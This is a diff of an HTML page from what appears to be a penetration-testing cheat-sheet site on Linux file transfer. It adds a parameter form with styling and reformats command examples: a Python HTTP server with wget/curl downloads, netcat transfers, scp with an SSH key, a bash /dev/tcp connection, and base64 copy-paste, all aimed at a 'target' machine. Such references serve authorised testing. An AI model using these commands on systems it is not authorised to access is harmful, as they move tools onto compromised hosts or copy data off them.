@@ -191,8 +191,131 @@
   <li><a href="https://tldrbins.github.io/@scp/">Scp</a></li>
   
 </ul>
+<hr>
+<div class="content">
+<div id="params">
+	<form id="params_form" style="display: none;">
+	</form>
+	<div class="center">
+		<button id="form_btn">Show Params Form</button>
+		<button id="replace_btn" style="display: none;">Replace Params</button>
+		<button id="reset_btn" style="display: none;">Reset</button>
+		<button id="clear_btn" style="display: none;">Clear Cache</button>
+	</div>
+</div>
 
-<div class="content"><hr>
+<style>
+#params {
+	width: 100%;
+	margin: 0 auto;
+	background-color: white;
+	padding: 20px 50px 40px;
+	box-shadow: 1px 4px 10px 1px #aaa;
+	font-family: system-ui;
+}
+
+#params * {
+    box-sizing: border-box;
+}
+
+#params input {
+  margin-bottom: 15px;
+}
+
+#params input[type=text] {
+	display: block;
+	height: 32px;
+	padding: 6px 16px;
+	width: 100%;
+	border: none;
+	background-color: #f5f5f5;
+}
+
+#params label {
+	color: #333333;
+	font-size: 0.9rem;
+}
+
+#params button {
+	display: inline-block;
+	margin: 20px auto 0;
+	width: 150px;
+	height: 40px;
+	border-radius: 25px;
+	border: none;
+	color: #f5f5f5;
+	font-weight: 700;
+	background: rgba(44, 82, 179);
+}
+
+#params button:hover {
+    cursor: pointer;
+    background: rgba(44, 82, 179, 0.95);
+}
+
+.center {
+	display: flex;
+	justify-content: center;
+	align-items: center;
+}
+
+ 
+body.dark-mode #params {
+	width: 100%;
+	margin: 0 auto;
+	background-color: #23272a;
+	padding: 20px 50px 40px;
+	box-shadow: 1px 4px 10px 1px #23272a;
+	font-family: system-ui;
+}
+
+body.dark-mode #params * {
+    box-sizing: border-box;
+}
+
+body.dark-mode #params input {
+	border-radius: 0.2em;
+	border: 0.1em solid #eeeeee;
+}
+
+body.dark-mode #params input:focus {
+	margin-bottom: 15px;
+	outline: 0.1em solid #eeeeee;
+}
+
+body.dark-mode #params input[type=text] {
+	display: block;
+	height: 32px;
+	padding: 6px 16px;
+	width: 100%;
+	border: none;
+	background-color: #bdbdbd;
+}
+
+body.dark-mode #params label {
+	color: #fafafa;
+	font-size: 0.9rem;
+}
+
+body.dark-mode #params button {
+	display: inline-block;
+	margin: 20px auto 0;
+	width: 150px;
+	height: 40px;
+	border-radius: 25px;
+	border: none;
+	color: #fafafa;
+	font-weight: 700;
+	background: #616161;
+}
+
+body.dark-mode #params button:hover {
+    cursor: pointer;
+    background: #424242;
+}
+
+
+</style>
 <p>
 <button data-tabset="set1" data-tabcontent="tab1" class="active">HTTP</button>
 
@@ -205,61 +328,62 @@
 <button data-tabset="set1" data-tabcontent="tab5" >Base64</button>
 
 <div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Start a local HTTP server</span>
-</span></span><span class="line"><span class="cl">python3 -m http.server <span class="m">80</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># In target Linux machine</span>
-</span></span><span class="line"><span class="cl">wget &lt;LOCAL_IP&gt;/&lt;FILE&gt;
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># In target Linux machine</span>
-</span></span><span class="line"><span class="cl">curl &lt;LOCAL_IP&gt;/&lt;FILE&gt; -o &lt;REMOTE_DEST_PATH&gt;
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Start a <span class="nb">local</span> HTTP server
+</span></span><span class="line"><span class="cl"><span class="go">python3 -m http.server &lt;LOCAL_PORT&gt;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> In target Linux machine
+</span></span><span class="line"><span class="cl"><span class="go">wget &lt;LOCAL_IP&gt;/&lt;FILE&gt;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> In target Linux machine
+</span></span><span class="line"><span class="cl"><span class="go">curl &lt;LOCAL_IP&gt;/&lt;FILE&gt; -o &lt;REMOTE_DEST_PATH&gt;
+</span></span></span></code></pre></div></div>
 </div>
 
 <div class="tabcontent" data-tabset="set1" data-tabcontent="tab2"><div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># In our local Linux machine</span>
-</span></span><span class="line"><span class="cl">nc -lvnp <span class="m">4444</span> &lt; &lt;FILE&gt;
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># In target Linux machine</span>
-</span></span><span class="line"><span class="cl">nc -w3 &lt;LOCAL_IP&gt; <span class="m">4444</span> &gt; &lt;FILE&gt;
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> In our <span class="nb">local</span> Linux machine
+</span></span><span class="line"><span class="cl"><span class="go">nc -lvnp &lt;LOCAL_PORT&gt; &lt; &lt;FILE&gt;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> In target Linux machine
+</span></span><span class="line"><span class="cl"><span class="go">nc -w3 &lt;LOCAL_IP&gt; &lt;LOCAL_PORT&gt; &gt; &lt;FILE&gt;
+</span></span></span></code></pre></div></div>
 </div>
 
 <div class="tabcontent" data-tabset="set1" data-tabcontent="tab3"><div>
 <h4 id="remote-to-local">Remote to Local</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># If you have target password</span>
-</span></span><span class="line"><span class="cl">scp &lt;USER&gt;@&lt;TARGET&gt;:&lt;REMOTE_FILE_PATH&gt; &lt;LOCAL_DEST_PATH&gt;
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># If you have a ssh key</span>
-</span></span><span class="line"><span class="cl">scp -i id_rsa &lt;USER&gt;@&lt;TARGET&gt;:&lt;REMOTE_FILE_PATH&gt; &lt;LOCAL_DEST_PATH&gt;
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> If you have target password
+</span></span><span class="line"><span class="cl"><span class="go">scp &lt;USER&gt;@&lt;TARGET&gt;:&lt;REMOTE_FILE_PATH&gt; &lt;LOCAL_DEST_PATH&gt;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> If you have a ssh key
+</span></span><span class="line"><span class="cl"><span class="go">scp -i id_rsa &lt;USER&gt;@&lt;TARGET&gt;:&lt;REMOTE_FILE_PATH&gt; &lt;LOCAL_DEST_PATH&gt;
+</span></span></span></code></pre></div></div>
 <h4 id="local-to-remote">Local to Remote</h4>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># If you have target password</span>
-</span></span><span class="line"><span class="cl">scp &lt;LOCAL_FILE_PATH&gt; &lt;USER&gt;@&lt;TARGET&gt;:&lt;REMOTE_DEST_PATH&gt;
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># If you have a ssh key</span>
-</span></span><span class="line"><span class="cl">scp -i id_rsa &lt;LOCAL_FILE_PATH&gt; &lt;USER&gt;@&lt;TARGET&gt;:&lt;REMOTE_DEST_PATH&gt;
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> If you have target password
+</span></span><span class="line"><span class="cl"><span class="go">scp &lt;LOCAL_FILE_PATH&gt; &lt;USER&gt;@&lt;TARGET&gt;:&lt;REMOTE_DEST_PATH&gt;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> If you have a ssh key
+</span></span><span class="line"><span class="cl"><span class="go">scp -i id_rsa &lt;LOCAL_FILE_PATH&gt; &lt;USER&gt;@&lt;TARGET&gt;:&lt;REMOTE_DEST_PATH&gt;
+</span></span></span></code></pre></div></div>
 </div>
 
 <div class="tabcontent" data-tabset="set1" data-tabcontent="tab4"><div>
 <h4 id="local-to-remote">Local to Remote</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># In our local Linux machine</span>
-</span></span><span class="line"><span class="cl">cat &lt;FILE&gt; <span class="p">|</span> nc -lnvp <span class="m">4444</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># In target Linux machine</span>
-</span></span><span class="line"><span class="cl"><span class="nb">exec</span> 3&lt;&gt;/dev/tcp/&lt;LOCAL_IP&gt;/4444
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Ctrl+C to interrupt after some time</span>
-</span></span><span class="line"><span class="cl">cat &lt;<span class="p">&amp;</span><span class="m">3</span> &gt; &lt;FILE&gt;
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Check</span>
-</span></span><span class="line"><span class="cl">md5sum &lt;FILE&gt;
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> In our <span class="nb">local</span> Linux machine
+</span></span><span class="line"><span class="cl"><span class="go">cat &lt;FILE&gt; | nc -lnvp &lt;LOCAL_PORT&gt;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> In target Linux machine
+</span></span><span class="line"><span class="cl"><span class="go">exec 3&lt;&gt;/dev/tcp/&lt;LOCAL_IP&gt;/&lt;LOCAL_PORT&gt;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Ctrl+C to interrupt after some <span class="nb">time</span>
+</span></span><span class="line"><span class="cl"><span class="go">cat &lt;&amp;3 &gt; &lt;FILE&gt;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Check
+</span></span><span class="line"><span class="cl"><span class="go">md5sum &lt;FILE&gt;
+</span></span></span></code></pre></div></div>
 </div>
 
 <div class="tabcontent" data-tabset="set1" data-tabcontent="tab5"><div>
 <h4 id="small-binary">Small binary</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Base64 encode binary</span>
-</span></span><span class="line"><span class="cl">cat &lt;FILE&gt; <span class="p">|</span> base64 -w0
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Copy and paste the base64 encoded binary</span>
-</span></span><span class="line"><span class="cl"><span class="nb">echo</span> -n <span class="s1">&#39;&lt;BASE64_FILE&gt;&#39;</span> <span class="p">|</span> base64 -d &gt; &lt;FILE&gt;
-</span></span></code></pre></div><p><small><em>Note: For restricted environment</em></small></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Base64 encode binary
+</span></span><span class="line"><span class="cl"><span class="go">cat &lt;FILE&gt; | base64 -w0
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Copy and paste the base64 encoded binary
+</span></span><span class="line"><span class="cl"><span class="go">echo -n &#39;&lt;BASE64_FILE&gt;&#39; | base64 -d &gt; &lt;FILE&gt;
+</span></span></span></code></pre></div><p><small><em>Note: For restricted environment</em></small></p>
 </div></div></p>
-<br></div></div>
+<br>
+</div></div>
     
     <script src="/js/utils.js"></script>
     <footer>
